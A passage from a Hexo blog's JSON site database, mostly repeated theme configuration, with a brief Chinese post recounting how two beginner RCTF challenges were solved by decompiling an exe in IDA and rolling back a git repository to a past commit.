height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"","more":""},{"title":"home","date":"2018-05-07T20:57:16.000Z","_content":"","source":"home/index.md","raw":"---\ntitle: home\ndate: 2018-05-08 04:57:16\n---\n","updated":"2018-05-09T10:52:34.000Z","path":"home/index.html","comments":1,"layout":"page","_id":"ckffbhowu0008ez8kd564s1nk","content":"","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"","more":""},{"title":"tags","date":"2018-05-07T20:57:28.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2018-05-08 04:57:28\ntype: \"tags\"\n---\n","updated":"2018-05-10T07:02:23.000Z","path":"tags/index.html","comments":1,"layout":"page","_id":"ckffbhp070044ez8kf564r8pj","content":"","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"","more":""}],"Post":[{"title":"RCTF部分wirteup","index_img":"/img/2018-05-22/index.jpg","date":"2018-05-22T13:51:53.000Z","_content":"### 总结RCTF的sign和git两道题\n<!--more-->\n##### sign\n&emsp;&emsp;下载得到一个exe，用ida打开，这里选择第二个，如图\n![ida](/img/2018-05-22/ida.png)\n看到WinMain函数\n![WinMain](/img/2018-05-22/WinMain.png)\n按F5反编译就直接看到flag了\n![F5](/img/2018-05-22/f5.png)\n##### git\n&emsp;&emsp;下载下来是一个`.git`文件夹，推测跟git有关，随便打开文件看看看到一些信息\n![git](/img/2018-05-22/git.png)\n稍微了解git应该知道git有分支，回溯分支应该可以还原flag，查看logs\n![flag](/img/2018-05-22/flag.png)\nlinux下使用下面的命令回溯\n```\ngit reset --hard f4d0f6ddf6660f5c9273c84f3de64840a407bef1\n```\n![reset](/img/2018-05-22/reset.png)\ncat flag.txt\n![cat](/img/2018-05-22/cat.png)\n更多的writeup参考大佬的吧，小弟能力有限，就只能~~做出~~复现这些\n大佬的博客-->[这里](https://delcoding.github.io/#blog)\n\n","source":"_posts/2018-05-22-writeup1.md","raw":"---\ntitle: RCTF部分wirteup\nindex_img: /img/2018-05-22/index.jpg\ndate: 2018-05-22 21:51:53\ntags: \n- writeup\n- 逆向\n- misc\n- git\n---\n### 总结RCTF的sign和git两道题\n<!--more-->\n##### sign\n&emsp;&emsp;下载得到一个exe，用ida打开，这里选择第二个，如图\n![ida](/img/2018-05-22/ida.png)\n看到WinMain函数\n![WinMain](/img/2018-05-22/WinMain.png)\n按F5反编译就直接看到flag了\n![F5](/img/2018-05-22/f5.png)\n##### git\n&emsp;&emsp;下载下来是一个`.git`文件夹，推测跟git有关，随便打开文件看看看到一些信息\n![git](/img/2018-05-22/git.png)\n稍微了解git应该知道git有分支，回溯分支应该可以还原flag，查看logs\n![flag](/img/2018-05-22/flag.png)\nlinux下使用下面的命令回溯\n```\ngit reset --hard f4d0f6ddf6660f5c9273c84f3de64840a407bef1\n```\n![reset](/img/2018-05-22/reset.png)\ncat flag.txt\n![cat](/img/2018-05-22/cat.png)\n更多的writeup参考大佬的吧，小弟能力有限，就只能~~做出~~复现这些\n大佬的博客-->[这里](https://delcoding.github.io/#blog)\n\n","slug":"writeup1","published":1,"mouth":"05","updated":"2020-09-18T03:21:12.764Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhovn0000ez8kufwwke8g","content":"<h3 id=\"总结RCTF的sign和git两道题\"><a href=\"#总结RCTF的sign和git两道题\" class=\"headerlink\" title=\"总结RCTF的sign和git两道题\"></a>总结RCTF的sign和git两道题</h3><a id=\"more\"></a>\n<h5 id=\"sign\"><a href=\"#sign\" class=\"headerlink\" title=\"sign\"></a>sign</h5><p>&emsp;&emsp;下载得到一个exe，用ida打开，这里选择第二个，如图<br><img src=\"/img/2018-05-22/ida.png\" srcset=\"/img/static/loading.gif\" alt=\"ida\"><br>看到WinMain函数<br><img src=\"/img/2018-05-22/WinMain.png\" srcset=\"/img/static/loading.gif\" alt=\"WinMain\"><br>按F5反编译就直接看到flag了<br><img src=\"/img/2018-05-22/f5.png\" srcset=\"/img/static/loading.gif\" alt=\"F5\"></p>\n<h5 id=\"git\"><a href=\"#git\" class=\"headerlink\" title=\"git\"></a>git</h5><p>&emsp;&emsp;下载下来是一个<code>.git</code>文件夹，推测跟git有关，随便打开文件看看看到一些信息<br><img src=\"/img/2018-05-22/git.png\" srcset=\"/img/static/loading.gif\" alt=\"git\"><br>稍微了解git应该知道git有分支，回溯分支应该可以还原flag，查看logs<br><img src=\"/img/2018-05-22/flag.png\" srcset=\"/img/static/loading.gif\" alt=\"flag\"><br>linux下使用下面的命令回溯<br><pre><code class=\"hljs undefined\">git reset --hard f<span class=\"hljs-number\">4</span>d<span class=\"hljs-number\">0</span>f<span class=\"hljs-number\">6</span>ddf<span class=\"hljs-number\">6660</span>f<span class=\"hljs-number\">5</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">9273</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">84</span>f<span class=\"hljs-number\">3</span>de<span class=\"hljs-number\">64840</span>a<span class=\"hljs-number\">407</span>bef<span class=\"hljs-number\">1</span></code></pre></p>\n<p><img src=\"/img/2018-05-22/reset.png\" srcset=\"/img/static/loading.gif\" alt=\"reset\"><br>cat flag.txt<br><img src=\"/img/2018-05-22/cat.png\" srcset=\"/img/static/loading.gif\" alt=\"cat\"><br>更多的writeup参考大佬的吧，小弟能力有限，就只能<del>做出</del>复现这些<br>大佬的博客–&gt;<a href=\"https://delcoding.github.io/#blog\" target=\"_blank\" rel=\"noopener\">这里</a></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<h3 id=\"总结RCTF的sign和git两道题\"><a href=\"#总结RCTF的sign和git两道题\" class=\"headerlink\" title=\"总结RCTF的sign和git两道题\"></a>总结RCTF的sign和git两道题</h3>","more":"<h5 id=\"sign\"><a href=\"#sign\" class=\"headerlink\" title=\"sign\"></a>sign</h5><p>&emsp;&emsp;下载得到一个exe，用ida打开，这里选择第二个，如图<br><img src=\"/img/2018-05-22/ida.png\" srcset=\"/img/static/loading.gif\" alt=\"ida\"><br>看到WinMain函数<br><img src=\"/img/2018-05-22/WinMain.png\" srcset=\"/img/static/loading.gif\" 